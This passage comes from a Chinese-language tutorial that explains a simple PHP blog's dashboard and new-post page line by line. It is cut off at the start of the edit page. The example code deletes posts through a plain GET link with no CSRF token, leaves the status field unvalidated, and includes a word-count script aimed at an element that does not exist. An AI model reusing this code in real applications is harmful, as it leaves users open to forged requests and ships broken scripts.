class="title">style</span>=&quot;<span class="title">color</span>: &lt;?= $<span class="title">post</span>[&#x27;<span class="title">status</span>&#x27;] == &#x27;<span class="title">published</span>&#x27; ? &#x27;#27<span class="title">ae60</span>&#x27; : &#x27;#<span class="title">f39c12</span>&#x27; ?&gt;&quot;&gt;</span></span><br><span class="line"><span class="class">                                    &lt;?= $<span class="title">post</span>[&#x27;<span class="title">status</span>&#x27;] == &#x27;<span class="title">published</span>&#x27; ? &#x27;已发布&#x27; : &#x27;草稿&#x27; ?&gt;</span></span><br><span class="line"><span class="class">                                &lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">td</span>&gt;&lt;?= <span class="title">date</span>(&#x27;<span class="title">Y</span>-<span class="title">m</span>-<span class="title">d</span> <span class="title">H</span>:<span class="title">i</span>&#x27;, <span class="title">strtotime</span>($<span class="title">post</span>[&#x27;<span class="title">created_at</span>&#x27;])) ?&gt;&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">post</span>-<span class="title">actions</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                    &lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">edit</span>-<span class="title">post</span>.<span class="title">php</span>?<span class="title">id</span>=&lt;?= $<span class="title">post</span>[&#x27;<span class="title">id</span>&#x27;] ?&gt;&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">edit</span>&quot;&gt;编辑&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                                    &lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">delete</span>-<span class="title">post</span>.<span class="title">php</span>?<span class="title">id</span>=&lt;?= $<span class="title">post</span>[&#x27;<span class="title">id</span>&#x27;] ?&gt;&quot; </span></span><br><span class="line"><span class="class">                                       <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">danger</span>&quot; </span></span><br><span class="line"><span class="class">                                       <span class="title">onclick</span>=&quot;<span class="title">return</span> <span class="title">confirm</span>(&#x27;确定要删除这篇文章吗？&#x27;)&quot;&gt;删除&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;?<span class="title">php</span> <span class="title">endforeach</span>; ?&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">tbody</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">table</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">else</span>: ?&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">style</span>=&quot;<span class="title">text</span>-<span class="title">align</span>: <span class="title">center</span>; <span class="title">padding</span>: 3<span class="title">rem</span>; <span class="title">background</span>: <span class="title">white</span>; <span class="title">border</span>-<span class="title">radius</span>: 5<span class="title">px</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;您还没有发布任何文章&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">new</span>-<span class="title">post</span>.<span class="title">php</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;开始写第一篇文章&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">main</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>下面我们逐行看一下代码。</p></li><li><p>引入部分不再赘述。</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">isLoggedIn</span>()) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ../login.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>验证用户是否登录，如果没有登录则重定向回登陆首页。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">    SELECT * FROM posts </span></span><br><span class="line"><span class="string">    WHERE author_id = ? </span></span><br><span class="line"><span class="string">    ORDER BY created_at DESC</span></span><br><span class="line"><span class="string">&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>]]);</span><br><span class="line"><span class="variable">$posts</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>();</span><br></pre></td></tr></table></figure><ul><li>准备SQL语句透过用户ID获取所有文章并展示在前端页面上。</li></ul><h4 id="3-2-new-post-php（新建文章页面）"><a href="#3-2-new-post-php（新建文章页面）" class="headerlink" title="3.2 new-post.php（新建文章页面）"></a>3.2 <code>new-post.php</code>（新建文章页面）</h4><ul><li>提供创建新文章的界面和处理逻辑，与编辑页面结构相似但功能独立。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;../includes/db.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;../includes/auth.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">isLoggedIn</span>()) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ../login.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$error</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$success</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$title</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$status</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;status&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$title</span>) || <span class="keyword">empty</span>(<span class="variable">$content</span>)) &#123;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;标题和内容不能为空&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">            INSERT INTO posts (title, content, author_id, status) </span></span><br><span class="line"><span class="string">            VALUES (?, ?, ?, ?)</span></span><br><span class="line"><span class="string">        &quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$title</span>, <span class="variable">$content</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>], <span class="variable">$status</span>])) &#123;</span><br><span class="line">            <span class="variable">$success</span> = <span class="string">&#x27;文章发布成功！&#x27;</span>;</span><br><span class="line">            <span class="comment">// 清空表单</span></span><br><span class="line">            <span class="variable">$title</span> = <span class="variable">$content</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$error</span> = <span class="string">&#x27;发布失败，请重试&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;写文章 - 我的博客&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;../css/style.css&quot;</span>&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        .editor-container &#123;</span><br><span class="line">            background: white;</span><br><span class="line">            padding: <span class="number">2</span>rem;</span><br><span class="line">            border-radius: <span class="number">5</span>px;</span><br><span class="line">            box-shadow: <span class="number">0</span> <span class="number">2</span>px <span class="number">5</span>px <span class="title function_ invoke__">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .form-group &#123;</span><br><span class="line">            margin-bottom: <span class="number">1.5</span>rem;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        label &#123;</span><br><span class="line">            display: block;</span><br><span class="line">            margin-bottom: <span class="number">0.5</span>rem;</span><br><span class="line">            font-weight: bold;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        input[type=<span class="string">&quot;text&quot;</span>], textarea &#123;</span><br><span class="line">            width: <span class="number">100</span>%;</span><br><span class="line">            padding: <span class="number">0.75</span>rem;</span><br><span class="line">            border: <span class="number">1</span>px solid <span class="comment">#ddd;</span></span><br><span class="line">            border-radius: <span class="number">4</span>px;</span><br><span class="line">            font-size: <span class="number">1</span>rem;</span><br><span class="line">            font-family: inherit;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        textarea &#123;</span><br><span class="line">            min-height: <span class="number">300</span>px;</span><br><span class="line">            resize: vertical;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .form-actions &#123;</span><br><span class="line">            display: flex;</span><br><span class="line">            justify-content: space-between;</span><br><span class="line">            align-items: center;</span><br><span class="line">            margin-top: <span class="number">2</span>rem;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .status-select &#123;</span><br><span class="line">            padding: <span class="number">0.5</span>rem;</span><br><span class="line">            border: <span class="number">1</span>px solid <span class="comment">#ddd;</span></span><br><span class="line">            border-radius: <span class="number">4</span>px;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;header&gt;</span><br><span class="line">        &lt;nav&gt;</span><br><span class="line">            &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">logo</span>&quot;&gt;我的博客&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span>-<span class="title">links</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;../<span class="title">index</span>.<span class="title">php</span>&quot;&gt;首页&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot;&gt;控制台&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">logout</span>.<span class="title">php</span>&quot;&gt;退出&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">header</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">main</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h1</span>&gt;写文章&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">if</span> ($<span class="title">error</span>): ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">error</span>&quot;&gt;&lt;?= $<span class="title">error</span> ?&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">if</span> ($<span class="title">success</span>): ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">message</span>&quot;&gt;&lt;?= $<span class="title">success</span> ?&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">editor</span>-<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">title</span>&quot;&gt;文章标题&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">id</span>=&quot;<span class="title">title</span>&quot; <span class="title">name</span>=&quot;<span class="title">title</span>&quot; </span></span><br><span class="line"><span class="class">                           <span class="title">value</span>=&quot;&lt;?= <span class="title">isset</span>($<span class="title">title</span>) ? <span class="title">htmlspecialchars</span>($<span class="title">title</span>) : &#x27;&#x27; ?&gt;&quot; </span></span><br><span class="line"><span class="class">                           <span class="title">placeholder</span>=&quot;请输入文章标题&quot; <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                </span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">content</span>&quot;&gt;文章内容&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">textarea</span> <span class="title">id</span>=&quot;<span class="title">content</span>&quot; <span class="title">name</span>=&quot;<span class="title">content</span>&quot; </span></span><br><span class="line"><span class="class">                              <span class="title">placeholder</span>=&quot;请输入文章内容&quot; <span class="title">required</span>&gt;&lt;?= <span class="title">isset</span>($<span class="title">content</span>) ? <span class="title">htmlspecialchars</span>($<span class="title">content</span>) : &#x27;&#x27; ?&gt;&lt;/<span class="title">textarea</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                </span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">actions</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">status</span>&quot;&gt;状态:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">select</span> <span class="title">id</span>=&quot;<span class="title">status</span>&quot; <span class="title">name</span>=&quot;<span class="title">status</span>&quot; <span class="title">class</span>=&quot;<span class="title">status</span>-<span class="title">select</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">option</span> <span class="title">value</span>=&quot;<span class="title">published</span>&quot;&gt;发布&lt;/<span class="title">option</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">option</span> <span class="title">value</span>=&quot;<span class="title">draft</span>&quot;&gt;草稿&lt;/<span class="title">option</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">select</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                    </span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;发布文章&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span>&quot;&gt;取消&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">main</span>&gt;</span></span><br><span class="line"><span class="class">    </span></span><br><span class="line"><span class="class">    &lt;<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">        // 简单的字数统计</span></span><br><span class="line"><span class="class">        <span class="title">document</span>.<span class="title">getElementById</span>(&#x27;<span class="title">content</span>&#x27;).<span class="title">addEventListener</span>(&#x27;<span class="title">input</span>&#x27;, <span class="title">function</span>() </span>&#123;</span><br><span class="line">            <span class="keyword">const</span> <span class="variable constant_">charCount</span> = this.value.length;</span><br><span class="line">            document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;charCount&#x27;</span>).textContent = charCount;</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li><p>我们依旧来逐行看一下。</p></li><li><p>验证登录、引入文件和初始化变量<code>$error</code>和变量<code>$success</code>部分跳过。</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br></pre></td></tr></table></figure><ul><li>检查当前请求是否为POST方法。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$title</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="variable">$status</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;status&#x27;</span>];</span><br></pre></td></tr></table></figure><ul><li>从POST数据中获取标题、内容和状态。</li><li><code>trim()</code>函数去除字符串两端的空白字符。</li><li>数据来源：<code>$_POST</code>超全局数组，包含通过POST方法提交的表单数据。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$title</span>) || <span class="keyword">empty</span>(<span class="variable">$content</span>)) &#123;</span><br><span class="line">    <span class="variable">$error</span> = <span class="string">&#x27;标题和内容不能为空&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>输入验证检查标题和内容是否为空，<code>empty()</code>函数检查变量是否为”空”（空字符串、0、null等），如果任一字段为空，设置错误信息。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">    INSERT INTO posts (title, content, author_id, status) </span></span><br><span class="line"><span class="string">    VALUES (?, ?, ?, ?)</span></span><br><span class="line"><span class="string">&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$title</span>, <span class="variable">$content</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>], <span class="variable">$status</span>])) &#123;</span><br><span class="line">    <span class="variable">$success</span> = <span class="string">&#x27;文章发布成功！&#x27;</span>;</span><br><span class="line">    <span class="variable">$title</span> = <span class="variable">$content</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$error</span> = <span class="string">&#x27;发布失败，请重试&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>数据库操作，准备SQL插入语句。<code>execute()</code>方法执行预处理语句，传入参数数组，<code>$_SESSION[&#39;user_id&#39;]</code>从会话中获取当前用户ID，如果执行成功返回成功消息并清空标题和内容变量。反之，返回失败消息。</li></ul><h4 id="3-3-edit-post-php（文章编辑页面）"><a href="#3-3-edit-post-php（文章编辑页面）" class="headerlink" title="3.3 edit-post.php（文章编辑页面）"></a>3.3 <code>edit-post.php</code>（文章编辑页面）</h4><ul><li>这是一个<strong>混合型脚本</strong>，既处理文章更新逻辑，又显示编辑表单界面。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span 